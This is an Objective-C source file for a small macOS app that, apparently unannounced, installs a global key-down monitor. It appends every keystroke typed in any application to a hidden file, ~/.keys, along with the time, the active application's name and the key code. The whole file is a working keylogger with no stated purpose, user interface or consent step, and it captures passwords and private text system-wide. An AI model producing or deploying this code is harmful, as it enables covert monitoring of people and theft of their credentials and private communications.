#import <Cocoa/Cocoa.h>

@interface AppDelegate : NSObject <NSApplicationDelegate>
@end

@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
    [NSEvent addGlobalMonitorForEventsMatchingMask:NSKeyDownMask
                                           handler:^(NSEvent *event){
        NSDate *now = [[NSDate alloc] init];

        // Find the currently running app.
        NSArray *runningApps = [[NSWorkspace sharedWorkspace] runningApplications];
        NSString *appName = @"unknown";
        for (int i = 0; i < [runningApps count]; i++) {
            NSRunningApplication *app = [runningApps objectAtIndex: i];
            if ([app isActive])
                appName = [app localizedName];
        }

        NSString *update = [NSString stringWithFormat: @"%@ %@ %d %@\n", [now description], appName, event.keyCode, event.charactersIgnoringModifiers];
        FILE *f = fopen([[NSHomeDirectory() stringByAppendingString: @"/.keys"] UTF8String], "a");
        fprintf(f, "%s", [update UTF8String]);
        fclose(f);
    }];
}

@end

int main(int argc, char *argv[])
{
    AppDelegate *delegate = [[AppDelegate alloc] init];
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    NSApplication *app = [NSApplication sharedApplication];

    [app setDelegate:delegate];
    [NSApp run];

    [pool drain];
    [delegate release];
    return 0;
}
